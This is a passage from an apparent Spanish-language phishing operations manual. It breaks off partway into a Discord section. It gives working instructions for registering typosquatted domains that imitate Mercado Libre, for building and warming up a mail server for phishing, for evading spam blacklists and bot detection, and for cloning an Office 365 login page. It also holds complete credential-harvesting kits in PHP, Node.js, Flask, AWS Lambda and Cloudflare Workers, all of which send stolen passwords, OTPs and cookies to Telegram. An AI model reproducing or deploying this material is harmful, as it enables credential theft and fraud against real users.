# Registradores que aceptan crypto (sin KYC):
# 1. Njalla - desde $15/año, acepta BTC/Monero, privacidad incluida
# 2. Porkbun - desde $8/año, WHOIS privacy gratis
# 3. Namecheap - desde $8/año, WHOIS privacy incluido, pago con crypto
# 4. Gandi - desde $10/año, privacidad incluida

# WHOIS Privacy (obligatorio)
# Sin WHOIS privacy, cualquiera ve tu nombre, dirección, email
# La mayoría de registradores lo incluyen gratis hoy

# Fecha de creación del dominio
# Dominios < 30 días van directo a spam
# Comprar el dominio 3-6 meses antes de usarlo
# Dejarlo "estacionado" con una página placeholder

# Registrar dominio "lookalike" (typosquatting):
# Ejemplos para "mercadolibre.com.ar":
# mercadolibre-seguridad.com.ar
# mercadolibre-verificacion.com
# mercad0libre.com (zero en vez de o)
# mercadolibre.co (cambio de TLD)
# mercadolibre-ok.com.ar
# mercadolibre-ayuda.com

# Script para generar dominios similares con dnstwist:
git clone https://github.com/elceef/dnstwist
cd dnstwist
python3 dnstwist.py mercadolibre.com.ar > dominios_similares.txt
# Te genera centenares de opciones de typosquatting
```

### 17.3 Infraestructura de Email (Postfix + Dovecot + OpenDKIM + OpenDMARC)

```bash
# Configuración completa de servidor de correo para phishing
# Asume Ubuntu/Debian VPS

# ====== 1. Postfix (Servidor SMTP) ======
sudo apt install postfix postfix-policyd-spf-python
# Durante instalación: "Internet Site", mail.tudominio.com

# Configurar main.cf
sudo nano /etc/postfix/main.cf

# Configuración base para entregabilidad:
myhostname = mail.tudominio.com
myorigin = $mydomain
mydestination = $myhostname, localhost.$mydomain, $mydomain
mynetworks = 127.0.0.0/8
inet_interfaces = all
inet_protocols = ipv4

# Rate limiting (importante para no quemar IP)
smtpd_client_connection_rate_limit = 10
smtpd_client_connection_count_limit = 5
smtpd_client_message_rate_limit = 30
queue_minfree = 20971520

# TLS
smtpd_tls_cert_file = /etc/letsencrypt/live/mail.tudominio.com/fullchain.pem
smtpd_tls_key_file = /etc/letsencrypt/live/mail.tudominio.com/privkey.pem
smtpd_tls_security_level = may
smtpd_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1

# SMTP AUTH
smtpd_sasl_auth_enable = yes
smtpd_sasl_type = dovecot
smtpd_sasl_path = private/auth
smtpd_sasl_security_options = noanonymous
smtpd_relay_restrictions = permit_sasl_authenticated, permit_mynetworks, reject_unauth_destination

# ====== 2. Dovecot (IMAP/POP3 para recibir) ======
sudo apt install dovecot-core dovecot-imapd dovecot-pop3d dovecot-lmtpd

# /etc/dovecot/dovecot.conf:
protocols = imap pop3 lmtp
listen = *, ::

# /etc/dovecot/conf.d/10-mail.conf:
mail_location = maildir:/var/mail/vhosts/%d/%n

# /etc/dovecot/conf.d/10-auth.conf:
disable_plaintext_auth = yes
auth_mechanisms = plain login

# /etc/dovecot/conf.d/10-master.conf:
service auth {
  unix_listener /var/spool/postfix/private/auth {
    mode = 0660
    user = postfix
    group = postfix
  }
}

# ====== 3. OpenDKIM (DKIM Signing) ======
sudo apt install opendkim opendkim-tools

# /etc/opendkim.conf:
Domain tudominio.com
KeyFile /etc/opendkim/keys/tudominio.com/mail.private
Selector mail
Socket inet:8891@localhost

# Generar keys DKIM:
sudo mkdir -p /etc/opendkim/keys/tudominio.com
sudo opendkim-genkey -D /etc/opendkim/keys/tudominio.com/ -d tudominio.com -s mail
sudo chown -R opendkim:opendkim /etc/opendkim/

# Mostrar registro DNS a agregar:
sudo cat /etc/opendkim/keys/tudominio.com/mail.txt
# El output es algo como:
# mail._domainkey IN TXT "v=DKIM1; h=sha256; k=rsa; p=MIGfMA0GCSqGSIb4..."

# ====== 4. OpenDMARC (DMARC policy) ======
sudo apt install opendmarc

# /etc/opendmarc.conf:
AuthservID OpenDMARC
Pct 100
RejectFailures false
SoftwareHeader true
Socket inet:8893@localhost
TrustedAuthservIDs mail.tudominio.com

# History file:
sudo touch /var/log/opendmarc/opendmarc.dat
sudo chown opendmarc:opendmarc /var/log/opendmarc/opendmarc.dat

# ====== 5. Configurar DNS ======
# Agregar a DNS de tudominio.com:

# MX record:
mail.tudominio.com. IN MX 10 mail.tudominio.com.

# A record:
mail.tudominio.com. IN A <IP_SERVIDOR>

# SPF record:
tudominio.com. IN TXT "v=spf1 mx ip4:<IP_SERVIDOR> -all"

# DKIM record:
mail._domainkey.tudominio.com. IN TXT "v=DKIM1; h=sha256; k=rsa; p=..."

# DMARC record:
_dmarc.tudominio.com. IN TXT "v=DMARC1; p=none; rua=mailto:dmarc@tudominio.com; sp=none; adkim=s; aspf=s"

# Reverse DNS (PTR) - pedilo al proveedor VPS:
<IP_SERVIDOR>.in-addr.arpa. IN PTR mail.tudominio.com.

# ====== 6. Verificar todo ======
# Test SMTP manual:
openssl s_client -connect localhost:587 -starttls smtp
EHLO test.com
AUTH LOGIN
(base64 user)
(base64 pass)
MAIL FROM:<phish@tudominio.com>
RCPT TO:<test@gmail.com>
DATA
Subject: Test
From: Phish <phish@tudominio.com>
To: Test <test@gmail.com>

Esto es un test de entregabilidad.
.
QUIT

# Verificar entregabilidad:
# Crear cuenta en mail-tester.com
# Enviar mail a la dirección que te dan
# Revisar puntaje (ideal > 9/10)
```

### 17.4 [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) Warm-Up Schedule (30 Días)

```bash
# ====== PLAN DE WARM-UP ======
# Día 1-5: 5-10 emails/día a cuentas que controlás
# Día 6-10: 10-20 emails/día
# Día 11-15: 20-50 emails/día
# Día 16-20: 50-100 emails/día
# Día 21-25: 100-200 emails/día
# Día 26-30: 200-500 emails/día
# Día 31+: tráfico normal de campaña

# Script de warmup automático con Python
import smtplib
from email.mime.text import MIMEText
from time import sleep

def warmup_day(day, targets):
    count = min(10 * day, 500)
    smtp = smtplib.SMTP('localhost', 587)
    smtp.starttls()
    smtp.login('phish@tudominio.com', 'password')

    for target in targets[:count]:
        msg = MIMEText(f"Hola {target.split('@')[0]}, este es el test de warmup día {day}. Por favor respondé para mejorar reputación.")
        msg['Subject'] = f'Test warmup día {day}'
        msg['From'] = 'phish@tudominio.com'
        msg['To'] = target
        smtp.send_message(msg)
        sleep(5)

    smtp.quit()
    print(f"Día {day}: {count} emails enviados")

# ====== ACTIVIDADES ENTRE DÍAS ======
# Importante: los targets DEBEN interactuar con los emails
# Al menos 30% abrir, 10% responder, 5% hacer clic

# Configurar cuentas espejo para interactuar entre sí
# Account1@dominioA.com envía a account1@dominioB.com
# Account1@dominioB.com responde "Recibido, gracias!"

# Usar herramientas de warmup automático
# mailwarm.io, warmbox.ai, lemwarm.com
```

### 17.5 Reputación de IP y Monitoreo

```bash
# Listas negras principales a monitorear:
# https://www.spamhaus.org/zen/
# https://www.spamcop.net/
# https://barracudacentral.org/lookups
# https://www.sorbs.net/
# https://www.dnsbl.info/
# https://www.spamrats.com/

# Script de monitoreo de listas negras:
for bl in zen.spamhaus.org bl.spamcop.net b.barracudacentral.org dnsbl.sorbs.net; do
    result=$(dig +short $IP.$bl TXT)
    if [ -n "$result" ]; then
        echo "LISTADO en $bl: $result"
    else
        echo "LIMPIO en $bl"
    fi
done

# Google Postmaster Tools
# https://postmaster.google.com/
# Agregar dominio, verificar, monitorear reputación
# Parámetros:
# - Reputación IP (1-100)
# - Tasa de spam (óptimo < 0.1%)
# - Tasa de phishing (óptimo 0%)
# - Autenticación (SPF/DKIM/DMARC)
# - Feedback loop

# Microsoft SNDS (Smart Network Data Services)
# https://sendersupport.olc.protection.outlook.com/snds/
# Monitoreo de entregabilidad en Outlook/Hotmail
```

---

## 18. Landing Page Quality — Réplica Perfecta

### 18.1 HTML/CSS Perfect Replication

```html
<!-- Estrategia de clonado perfecto: -->
<!-- 1. No usar Site Cloner de SET (páginas rotas) -->
<!-- 2. Descargar manualmente con wget -->
<!-- 3. Copiar y adaptar los recursos -->

# Descargar página real completa (estática)
wget -r -l 2 -p -k -E -np https://target.com/login

# La flag -p descarga todos los recursos (CSS, JS, imágenes)
# -k convierte links para que funcionen localmente
# -E agrega .html a archivos sin extensión

# Para páginas SPA (React, Vue, Angular):
# Usar puppeteer para generar la página estática
cat > clone_spa.js << 'EOF'
const puppeteer = require('puppeteer');
(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto('https://target.com/login', {waitUntil: 'networkidle2'});
  await page.setViewport({width: 1366, height: 768});
  const html = await page.content();
  require('fs').writeFileSync('cloned_page.html', html);

  // Extraer recursos inline
  const resources = await page.evaluate(() => {
    return {
      css: Array.from(document.querySelectorAll('link[rel="stylesheet"]')).map(l => l.href),
      js: Array.from(document.querySelectorAll('script[src]')).map(s => s.src),
      imgs: Array.from(document.querySelectorAll('img[src]')).map(i => i.src)
    };
  });
  console.log(JSON.stringify(resources, null, 2));
  await browser.close();
})();
EOF

# Para formularios de login complejos con CSRF/state tokens:
# El clonado simple no funciona por los tokens dinámicos
# Usar reverse proxy (Evilginx2, Modlishka) en vez de clonado
```

### 18.2 Responsive Clone con Frameworks Modernos

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión - Office 365</title>
    <link rel="icon" href="https://www.office.com/favicon.ico">
    <!-- Ícono de candado SSL usando favicon de confianza -->
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">

    <!-- Usar dependencias externas para reducir tamaño -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" rel="stylesheet">

    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
        }

        .login-card {
            max-width: 400px;
            width: 100%;
            margin: 20px auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            overflow: hidden;
        }

        .login-header {
            background: #0078d4;
            color: white;
            padding: 30px;
            text-align: center;
        }

        .login-header i {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .login-body {
            padding: 30px;
        }

        .form-control {
            border-radius: 4px;
            padding: 12px;
            border: 1px solid #ddd;
            transition: border-color 0.3s;
        }

        .form-control:focus {
            border-color: #0078d4;
            box-shadow: 0 0 0 3px rgba(0,120,212,0.1);
        }

        .btn-login {
            background: #0078d4;
            border: none;
            padding: 12px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 4px;
            width: 100%;
            color: white;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn-login:hover {
            background: #106ebe;
        }

        .btn-login:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .error-message {
            color: #d32f2f;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }

        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 768px) {
            .login-card {
                margin: 10px;
            }
            .login-header {
                padding: 20px;
            }
            .login-body {
                padding: 20px;
            }
        }

        @media (max-width: 480px) {
            .login-header i {
                font-size: 36px;
            }
            .login-header h3 {
                font-size: 18px;
            }
        }
    </style>
</head>

<body>
    <div class="login-card">
        <div class="login-header">
            <i class="fas fa-shield-alt"></i>
            <h3>Verificación de Seguridad</h3>
            <p>Ingresá tus credenciales para continuar</p>
        </div>
        <div class="login-body">
            <form id="loginForm" method="POST" action="https://phish-server.com/capture">
                <div class="form-group">
                    <label for="email">Correo electrónico</label>
                    <input type="email" class="form-control" id="email" name="username" required autocomplete="email" placeholder="usuario@empresa.com">
                </div>
                <div class="form-group">
                    <label for="password">Contraseña</label>
                    <input type="password" class="form-control" id="password" name="password" required autocomplete="current-password" placeholder="••••••••">
                </div>
                <div class="form-check mb-3">
                    <input type="checkbox" class="form-check-input" id="remember" name="remember" checked>
                    <label class="form-check-label" for="remember">Mantener sesión iniciada</label>
                </div>
                <button type="submit" class="btn-login" id="submitBtn">
                    <span id="btnText">Verificar identidad</span>
                    <div class="spinner" id="spinner"></div>
                </button>
                <div class="error-message" id="errorMsg">Credenciales incorrectas. Intentá de nuevo.</div>
            </form>
            <div class="mt-3 text-center">
                <a href="#" style="color: #0078d4; font-size: 14px;">¿Olvidaste tu contraseña?</a>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();

            const btn = document.getElementById('submitBtn');
            const text = document.getElementById('btnText');
            const spinner = document.getElementById('spinner');
            const errorMsg = document.getElementById('errorMsg');

            text.style.display = 'none';
            spinner.style.display = 'block';
            btn.disabled = true;
            errorMsg.style.display = 'none';

            const formData = new FormData(this);

            fetch(this.action, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                setTimeout(() => {
                    text.style.display = 'inline';
                    spinner.style.display = 'none';
                    btn.disabled = false;
                    errorMsg.style.display = 'block';
                    // Después del error, redirigir al sitio real
                    setTimeout(() => {
                        window.location.href = 'https://www.office.com';
                    }, 3000);
                }, 2000);
            })
            .catch(error => {
                text.style.display = 'inline';
                spinner.style.display = 'none';
                btn.disabled = false;
                errorMsg.style.display = 'block';
                setTimeout(() => {
                    window.location.href = 'https://www.office.com';
                }, 3000);
            });
        };
    </script>
</body>
</html>
```

### 18.3 Bot Cloaking con [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) Quality Scoring

```javascript
// === Sistema completo de cloaking para landing page ===

// 1. IP Quality Score - detectar VPN/Proxy/DC
fetch('https://ipqualityscore.com/api/json/YOUR_API_KEY/' + 
  (await fetch('https://api.ipify.org?format=json').then(r => r.json())).ip)
.then(r => r.json())
.then(data => {
  if (data.proxy || data.vpn || data.tor || data.datacenter) {
    // Es un bot o scraper - servir página real
    window.location = 'https://real-site.com';
  }
});

// 2. User-Agent Filter - bloquear UAs de bots
const botUAs = [
  'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
  'yandexbot', 'sogou', 'exabot', 'facebot', 'twitterbot',
  'petalbot', 'semrush', 'ahrefs', 'mj12bot', 'majestic',
  'rogerbot', 'dotbot', 'screaming frog', 'wget', 'curl',
  'python-requests', 'go-http-client', 'scrapy', 'http client',
  'java', 'libwww', 'perl', 'ruby', 'php'
];

const ua = navigator.userAgent.toLowerCase();
const isBot = botUAs.some(bot => ua.includes(bot));

// 3. JavaScript Challenge - detectar navegadores sin JS completo
let jsScore = 0;
try {
  jsScore += typeof window !== 'undefined' ? 10 : 0;
  jsScore += typeof document !== 'undefined' ? 10 : 0;
  jsScore += typeof navigator !== 'undefined' ? 10 : 0;
  jsScore += typeof localStorage !== 'undefined' ? 10 : 0;
  jsScore += typeof fetch !== 'undefined' ? 10 : 0;
  jsScore += typeof WebSocket !== 'undefined' ? 10 : 0;
  jsScore += typeof XMLHttpRequest !== 'undefined' ? 10 : 0;
  jsScore += typeof atob !== 'undefined' ? 10 : 0;
  jsScore += typeof CanvasRenderingContext2D !== 'undefined' ? 10 : 0;
  jsScore += typeof AudioContext !== 'undefined' ? 10 : 0;
} catch(e) {}

// 4. Country Filter
const countryBlocklist = ['CN', 'RU', 'IR', 'KP', 'SY', 'CU', 'VE'];
fetch('https://ipapi.co/json/')
.then(r => r.json())
.then(data => {
  if (countryBlocklist.includes(data.country_code)) {
    window.location = 'https://real-site.com';
  }
});

// 5. Bot Detection Final
if (isBot || jsScore < 50) {
  window.location = 'https://real-site.com';
}

// 6. Honepot Form Field
// Agregar un campo oculto que solo bots completan
document.querySelector('input[name="website"]')?.remove();
```

### 18.4 [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) Certificate Validation (Candado Verde)

```bash
# === Forzar certificado SSL válido para que la víctima vea el candado verde ===

# 1. Let's Encrypt (gratis, confiable)
sudo apt install certbot python3-certbot-nginx
sudo certbot certonly --standalone -d login.tudominio.com
# Certificado en:
# /etc/letsencrypt/live/login.tudominio.com/fullchain.pem
# /etc/letsencrypt/live/login.tudominio.com/privkey.pem

# 2. Usar en landing page
server {
    listen 443 ssl;
    server_name login.tudominio.com;

    ssl_certificate /etc/letsencrypt/live/login.tudominio.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/login.tudominio.com/privkey.pem;

    root /var/www/phishing;
    index index.html;

    location / {
        try_files $uri $uri/ =404;
    }

    location /capture {
        proxy_pass http://localhost:8080;
    }
}

# 3. Redirigir HTTP a HTTPS
server {
    listen 80;
    server_name login.tudominio.com;
    return 301 https://$server_name$request_uri;
}

# 4. Verificar certificado
curl -vI https://login.tudominio.com
# Debe mostrar: SSL certificate verify ok
# Y el certificado debe ser emitido por: Let's Encrypt Authority X3
```

---

## 19. [phishing](../raw/ph1sh1ng.md) Kit Development (PHP, Node.js, [python](../raw/pyth0n-f0r-h4ck1ng.md), Serverless)

### 19.1 PHP Phishing Kit

```php
<?php
// index.php — Landing page de phishing
// Captura credenciales y guarda en archivo

session_start();

// Configuración
$redirect_url = "https://real-site.com"; // Donde redirigir después
$log_file = "logs/creds_" . date('Y-m-d') . ".txt";
$telegram_token = "TU_TOKEN";
$telegram_chat = "TU_CHAT_ID";

// Crear directorio de logs
if (!is_dir('logs')) {
    mkdir('logs', 0755, true);
}

// Capturar POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $otp = $_POST['otp'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');

    // Formatear datos
    $data = [
        'timestamp' => $timestamp,
        'username' => $username,
        'password' => $password,
        'otp' => $otp,
        'ip' => $ip,
        'user_agent' => $ua,
        'referer' => $_SERVER['HTTP_REFERER'] ?? '',
        'cookies' => $_SERVER['HTTP_COOKIE'] ?? '',
    ];

    // Guardar en archivo
    $log_entry = json_encode($data) . "\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

    // Enviar a Telegram
    $message = "🔴 NUEVAS CREDENCIALES\n"
        . "📧 Usuario: $username\n"
        . "🔑 Password: $password\n"
        . ($otp ? "🔐 OTP: $otp\n" : "")
        . "🌐 IP: $ip\n"
        . "🕐 Hora: $timestamp\n"
        . "📱 UA: $ua";

    file_get_contents("https://api.telegram.org/bot{$telegram_token}/sendMessage?" . http_build_query([
        'chat_id' => $telegram_chat,
        'text' => $message,
        'parse_mode' => 'HTML'
    ]));

    // Redirigir al sitio real (con la cookie de sesión)
    header("Location: $redirect_url");
    exit;
}

// Si no es POST, mostrar landing page
?>
<!DOCTYPE html>
<html>
<!-- Acá va el HTML de la landing page (ver sección 18.2) -->
</html>
```

### 19.2 Node.js/Express Phishing Kit

```javascript
// server.js — Phishing kit con Express
const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = 3000;
const TELEGRAM_TOKEN = 'TU_TOKEN';
const TELEGRAM_CHAT = 'TU_CHAT_ID';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

// Endpoint que captura credenciales
app.post('/capture', async (req, res) => {
    const { username, password, otp, ...rest } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const ua = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    const entry = {
        timestamp,
        username,
        password,
        otp: otp || 'N/A',
        ip,
        userAgent: ua,
        headers: req.headers,
        body: req.body
    };

    // Guardar en archivo JSON
    const logFile = path.join(__dirname, 'logs', `${Date.now()}.json`);
    fs.mkdirSync(path.join(__dirname, 'logs'), { recursive: true });
    fs.writeFileSync(logFile, JSON.stringify(entry, null, 2));

    // GeoIP lookup
    let geo = {};
    try {
        const geoRes = await axios.get(`https://ipapi.co/${ip}/json/`);
        geo = geoRes.data;
    } catch(e) {}

    // Enviar a Telegram
    const msg = `🔴 CREDENCIALES CAPTURADAS\n`
        + `📧 User: ${username}\n`
        + `🔑 Pass: ${password}\n`
        + `🔐 OTP: ${otp || 'N/A'}\n`
        + `🌐 IP: ${ip}\n`
        + `📍 Ubicacion: ${geo.city || '?'}, ${geo.country_name || '?'}\n`
        + `🕐 ${timestamp}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT,
            text: msg,
            parse_mode: 'HTML'
        });
    } catch(e) {}

    // Redirigir a pagina real
    res.redirect('https://real-site.com');
});

// Dashboard para ver credenciales capturadas
app.get('/admin', (req, res) => {
    const logs = fs.readdirSync(path.join(__dirname, 'logs'))
        .filter(f => f.endsWith('.json'))
        .map(f => JSON.parse(fs.readFileSync(path.join(__dirname, 'logs', f))))
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    res.json({ total: logs.length, entries: logs.slice(0, 50) });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Phishing kit corriendo en puerto ${PORT}`);
});
```

### 19.3 Python Flask Phishing Kit

```python
# app.py — Phishing kit con Flask
from flask import Flask, request, redirect, render_template_string
import json
import os
import requests
from datetime import datetime

app = Flask(__name__)

TELEGRAM_TOKEN = "TU_TOKEN"
TELEGRAM_CHAT = "TU_CHAT_ID"
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# Landing page HTML (cargar desde template)
LANDING_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <form method="POST" action="/capture">
        <input type="email" name="username" required>
        <input type="password" name="password" required>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""

@app.route('/')
def index():
    return LANDING_PAGE

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    otp = request.form.get('otp', '')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    ts = datetime.now().isoformat()

    # GeoIP
    try:
        geo = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5).json()
    except:
        geo = {}

    entry = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'otp': otp,
        'ip': ip,
        'user_agent': ua,
        'geo': geo
    }

    # Guardar local
    filename = f"{LOG_DIR}/{int(datetime.now().timestamp())}.json"
    with open(filename, 'w') as f:
        json.dump(entry, f, indent=2)

    # Telegram
    msg = (
        f"🔴 CREDENCIALES CAPTURADAS\n"
        f"📧 User: {username}\n"
        f"🔑 Pass: {password}\n"
        f"🔐 OTP: {otp or 'N/A'}\n"
        f"🌐 IP: {ip}\n"
        f"📍 {geo.get('city', '?')}, {geo.get('country_name', '?')}\n"
        f"🕐 {ts}"
    )
    requests.post(
        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
        json={'chat_id': TELEGRAM_CHAT, 'text': msg, 'parse_mode': 'HTML'}
    )

    return redirect('https://real-site.com')

@app.route('/admin')
def admin():
    entries = []
    for f in os.listdir(LOG_DIR):
        if f.endswith('.json'):
            with open(os.path.join(LOG_DIR, f)) as fh:
                entries.append(json.load(fh))
    entries.sort(key=lambda x: x['timestamp'], reverse=True)
    return json.dumps({'total': len(entries), 'entries': entries[:50]}, indent=2)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, ssl_context=('cert.pem', 'key.pem'))
```

### 19.4 Serverless Phishing ([aws](../raw/cl0ud-h4ck1ng.md#aws) Lambda + API Gateway)

```javascript
// AWS Lambda handler — Phishing serverless
// Sin servidores, solo código

exports.handler = async (event) => {
    const https = require('https');
    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT = process.env.TELEGRAM_CHAT;

    // Parsear request
    const body = event.body ? JSON.parse(event.body) : {};
    const username = body.username || '';
    const password = body.password || '';
    const ip = event.requestContext?.identity?.sourceIp || '0.0.0.0';
    const ua = event.headers?.['User-Agent'] || '';

    // Enviar a Telegram
    const msg = `🔴 Serverless Phish\n📧 ${username}\n🔑 ${password}\n🌐 ${ip}\n📱 ${ua}`;
    await new Promise((resolve, reject) => {
        const req = https.request({
            hostname: 'api.telegram.org',
            path: `/bot${TELEGRAM_TOKEN}/sendMessage`,
            method: 'POST',
            headers: {'Content-Type': 'application/json'}
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', resolve);
        });
        req.write(JSON.stringify({chat_id: TELEGRAM_CHAT, text: msg}));
        req.end();
    });

    // Redirigir
    return {
        statusCode: 302,
        headers: {
            'Location': 'https://real-site.com',
            'Content-Type': 'text/html'
        },
        body: ''
    };
};
```

### 19.5 Cloudflare Workers Phishing Kit

```javascript
// Cloudflare Worker — Phishing en el edge
// Se ejecuta en el CDN de Cloudflare, imposible de bloquear por IP

addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const url = new URL(request.url);

    // POST /capture = recibir credenciales
    if (url.pathname === '/capture' && request.method === 'POST') {
        const formData = await request.formData();
        const username = formData.get('username');
        const password = formData.get('password');
        const ip = request.headers.get('CF-Connecting-IP');
        const ua = request.headers.get('User-Agent');
        const country = request.cf?.country;

        // Guardar en KV (persistencia)
        await CREDS.put(
            `cred_${Date.now()}`,
            JSON.stringify({username, password, ip, ua, country, time: Date.now()})
        );

        // Notificar por Telegram via webhook
        await fetch(TELEGRAM_WEBHOOK, {
            method: 'POST',
            body: JSON.stringify({
                text: `🔴 Worker Phish\n📧 ${username}\n🔑 ${password}\n🌐 ${ip}\n📍 ${country}`
            })
        });

        return Response.redirect('https://real-site.com', 302);
    }

    // GET = servir landing page
    if (url.pathname === '/') {
        // Cloaking: si es bot, servir página real
        const ua = request.headers.get('User-Agent') || '';
        if (/bot|crawl|spider/i.test(ua)) {
            return fetch('https://real-site.com');
        }

        // Servir landing page desde KV o static
        const html = await ASSETS.get('index.html');
        return new Response(html, {
            headers: {'Content-Type': 'text/html'}
        });
    }
}
```

---

## 20. Telegram/Discord/Slack Integration para Realtime Alerts

### 20.1 Telegram Bot Setup Completo

```python
# bot_phishing.py — Bot de Telegram para gestionar campañas
import requests
import json
import time
import threading
from datetime import datetime

class PhishingBot:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"

    def send(self, text, parse_mode='HTML'):
        url = f"{self.base_url}/sendMessage"
        data = {
            'chat_id': self.chat_id,
            'text': text,
            'parse_mode': parse_mode,
            'disable_web_page_preview': True
        }
        return requests.post(url, data=data).json()

    def send_photo(self, photo_url, caption=''):
        url = f"{self.base_url}/sendPhoto"
        data = {
            'chat_id': self.chat_id,
            'photo': photo_url,
            'caption': caption,
            'parse_mode': 'HTML'
        }
        return requests.post(url, data=data).json()

    def send_document(self, file_path, caption=''):
        url = f"{self.base_url}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': self.chat_id, 'caption': caption}
            return requests.post(url, data=data, files=files).json()

    def notify_creds(self, cred):
        msg = (
            f"<b>🔴 NUEVAS CREDENCIALES</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📧 <b>Email:</b> <code>{cred.get('username', '?')}</code>\n"
            f"🔑 <b>Password:</b> <code>{cred.get('password', '?')}</code>\n"
            f"🔐 <b>OTP:</b> <code>{cred.get('otp', 'N/A')}</code>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🌐 <b>IP:</b> <code>{cred.get('ip', '?')}</code>\n"
            f"📍 <b>Pais:</b> {cred.get('country', '?')}\n"
            f"🕐 <b>Hora:</b> {cred.get('timestamp', datetime.now().isoformat())}\n"
            f"📱 <b>UA:</b> <code>{cred.get('ua', '?')[:50]}...</code>\n"
            f"━━━━━━━━━━━━━━━━"
        )
        self.send(msg)

    def notify_login_success(self, cred):
        """Cuando las credenciales son válidas y se logró acceso"""
        msg = (
            f"<b>✅ LOGIN EXITOSO</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📧 <b>Email:</b> <code>{cred['username']}</code>\n"
            f"🔑 <b>Password:</b> <code>{cred['password']}</code>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🎉 Sesion establecida correctamente\n"
            f"🔗 <b>Cookie:</b> <code>{cred.get('cookie', '?')[:100]}...</code>"
        )
        self.send(msg)

    def notify_campaign_stats(self, stats):
        msg = (
            f"<b>📊 ESTADISTICAS DE CAMPANA</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📨 <b>Enviados:</b> {stats.get('sent', 0)}\n"
            f"📬 <b>Entregados:</b> {stats.get('delivered', 0)}\n"
            f"👁 <b>Abiertos:</b> {stats.get('opened', 0)}\n"
            f"🖱 <b>Clickeados:</b> {stats.get('clicked', 0)}\n"
            f"📝 <b>Credenciales:</b> {stats.get('creds', 0)}\n"
            f"🚨 <b>Reportados:</b> {stats.get('reported', 0)}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📈 <b>Click Rate:</b> {stats.get('click_rate', 0)}%\n"
            f"📉 <b>Cred Rate:</b> {stats.get('cred_rate', 0)}%"
        )
        self.send(msg)

# Ejemplo de uso
bot = PhishingBot("1234567890:ABCdefGHIjklmNOPqrstUVwxyz", "-1001234567890")

# Al capturar credenciales
bot.notify_creds({
    'username': 'jperez@empresa.com',
    'password': 'Passw0rd2024!',
    'otp': '482193',
    'ip': '190.210.30.50',
    'country': 'Argentina',
    'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0',
    'timestamp': '2024-11-15 14:32:21'
})
```

### 20.2 Discord Webhook Integration

```python
import requests

def send_discord_alert(webhook_url, cred):
    """Enviar credenciales a canal de Discord via webhook"""
    data = {
        "content": None,
